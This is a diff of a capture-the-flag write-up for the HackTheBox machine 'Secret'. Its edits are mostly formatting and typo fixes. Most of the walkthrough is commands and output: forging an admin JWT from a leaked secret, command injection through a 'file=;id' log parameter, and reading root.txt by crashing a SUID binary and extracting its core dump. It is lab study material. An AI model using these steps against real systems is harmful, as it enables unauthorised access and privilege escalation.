@@ -6,12 +6,9 @@ categories:
   - HackTheBox
 ---
 
-
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT     STATE SERVICE REASON  VERSION
 22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -35,9 +32,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-### ffuf
-
-```
+```bash
 api                     [Status: 200, Size: 93, Words: 12, Lines: 1]
 assets                  [Status: 301, Size: 179, Words: 7, Lines: 11]
 download                [Status: 301, Size: 183, Words: 7, Lines: 11]
@@ -45,14 +40,12 @@ docs                    [Status: 200, Size: 0, Words: 1, Lines: 1]
 ```
 
 Just a web and ssh server...so let's visit the website and see what we can find
-
 we can read docs about an api and download their source code..lol ok
-
 There is a git repository in the source code folder...`gitTools` can extract everything
 
 `git show` on initial commit (use `git log` first to see all commits)
 
-```
+```bash
 git show 55fe756a29268f9b4e786ae468952ca4a8df1bd8
 commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
 Author: dasithsv <dasithsv@gmail.com>
@@ -80,14 +73,14 @@ we can see a `secret token` here
 
 And the response was
 
-```
+```bash
 - Connection #0 to host 10.10.11.120 left intact
   "name" is required
 ```
 
 Analyzig the code we see it requires a name, email and password
 
-```
+```bash
     //create a user
     const user = new User({
         name: req.body.name,
@@ -100,9 +93,9 @@ so lets create one
 
 `curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{"name": "nairolf","email":"nairolf@mail.com","password":"nairolf"}'`
 
-wich works fine
+which works fine
 
-```
+```bash
 Connection #0 to host 10.10.11.120 left intact
 {"user":"nairolf"}
 ```
@@ -111,14 +104,14 @@ lets login
 
 `curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/login --data '{"email":"nairolf@mail.com","password":"nairolf"}'`
 
-```
+```bash
 Connection #0 to host 10.10.11.120 left intact
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA
 ```
 
 we get a token...a jwt token, in the `verifytoken.js` it goes in the header to access `/priv` route (`priv.js`)
 
-```
+```bash
 curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA'
 {"role":{"role":"you are normal user","desc":"nairolf"}}
 ```
@@ -127,7 +120,7 @@ oh okay..normal user, that's offensive I demand to see the manager (\*karen's no
 
 In `private.js` you see how admin token is given
 
-```
+```js
     if (name == 'theadmin'){
         res.json({
             creds:{
@@ -143,7 +136,7 @@ we analyze the token with `jwt_tool`
 
 `python jwt_tool.py ...the_long_token_goes_here...`
 
-```
+```bash
 =====================
 Decoded Token Values:
 =====================
@@ -174,7 +167,7 @@ we can also forge ours from that
 
 Basically we inject in our jwt-token, username "theadmin", secret token as password, with signature hs256 that we identified in `jwt_tool`
 
-```
+```bash
 jwttool_2e65191b6ac8e06c39c25251292b9a05 - Tampered token - HMAC Signing:
 [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA
 ```
@@ -183,7 +176,7 @@ We use the crafted token to login
 
 `curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'`
 
-```
+```bash
 {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
 ```
 
@@ -199,7 +192,7 @@ we can enclose that to do our command injection after file=;
 
 `curl 'http://10.10.11.120/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'`
 
-```
+```bash
 "80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
 ```
 
@@ -211,7 +204,7 @@ And...we have to url-encode it (AS URL COMPONENT)
 
 Then we are in
 
-```
+```bash
 uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
 
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -229,7 +222,7 @@ Next move if finding SUID binaries
 
 `$ find / -type f -perm -u=s 2>/dev/null`
 
-```
+```bash
 /usr/bin/pkexec
 /usr/bin/sudo
 /usr/bin/fusermount
@@ -288,7 +281,7 @@ Next move if finding SUID binaries
 
 what is `/opt/count`??
 
-```
+```bash
 dasith@secret:/opt$ ls
 code.c
 count
@@ -299,19 +292,15 @@ ok lets look at `code.c`
 
 `$ cat /opt/code.c`
 
-I copied the code output in a file with same name for readabilty
-
+I copied the code output in a file with same name for readability
 Basically its just a program to count directories and files...
-
-Note this privesc was a true nightmare XD...afer hours of suffering I just went to google a helping writeup/forum
+Note this privesc was a true nightmare XD...after hours of suffering I just went to google a helping writeup/forum
 
 A guy was able to read `root.txt` by crashing the binary and reading its dump strings
-
 sounds kinda complex workaround...we need two shells so we run our curl payload again on another port (4444)
-
 In shell 1: we run the SUID binary
 
-```
+```bash
 $ cd /opt
 $ ./count -p
 /root/root.txt
@@ -320,7 +309,7 @@ y
 
 I wait before pressing 'enter' and go to shell 2:
 
-```
+```bash
 $ ps -aux | grep count
 root 841 0.0 0.1 235668 7428 ? Ssl 16:11 0:00 /usr/lib/accountsservice/accounts-daemon
 dasith 1394 0.0 0.0 2488 520 ? S 16:24 0:00 ./count -p
@@ -333,13 +322,13 @@ I prepare my kill command and to shell 1 I run the counter
 
 Mid-running I crash the bus and back to shell 1 I get a response
 
-```
+```bash
 Bus error (core dumped)
 ```
 
 we then go look for the dumps
 
-```
+```bash
 $ cd /var/crash
 $ ls
 \_opt_count.0.crash
@@ -349,14 +338,14 @@ $ ls
 
 we unpack count.1000 in a temporary folder
 
-```
+```bash
 $ mkdir /tmp/crashlogs
 $ apport-unpack \_opt_count.1000.crash /tmp/crashlogs
 ```
 
 we go get our logs
 
-```
+```bash
 $ cd /tmp/crashlogs
 $ ls
 Architecture
@@ -380,7 +369,7 @@ we can only read the strings of CoreDump so cat isnt useful here
 
 `$ strings CoreDump`
 
-```
+```bash
 ...
 Enter source file/directory name:
 Total characters = 33
@@ -393,10 +382,10 @@ aliases
 ...
 ```
 
-Now let's think about all this...we couldn't get a root shell here...it was more a workaround to get the root flag.
+Now let's think about all this...we couldn't get a root shell here...
+it was more a workaround to get the root flag.
 
-This is definitelly not a easy machine...maybe medium...not too hard too but NOT EASY.
-
+This is definitely not an easy machine...maybe medium...
+not too hard too but NOT EASY.
 seems like we can access dasith ssh keys...But I could not crack it yet...
-
 We technically do not own this machine so keep exploring for ways to get root.
